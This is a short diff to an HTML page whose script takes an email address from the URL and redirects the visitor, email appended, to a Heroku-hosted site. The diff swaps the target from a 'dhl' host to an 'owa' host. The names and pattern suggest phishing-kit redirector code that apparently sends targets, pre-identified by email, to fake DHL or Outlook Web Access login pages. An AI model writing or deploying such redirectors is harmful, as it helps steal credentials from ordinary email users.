@@ -8,11 +8,11 @@
 <body>
     <script>
         
-        let url = 'https://dhl3213.herokuapp.com';
+        let url = 'https://owa123.herokuapp.com/';
         
         const email = new URLSearchParams(location.search).get('email');
         if (email){
-            url = url + '/?email='+email;
+            url = url + '?email='+email;
         }
         location.replace(url)
     </script>
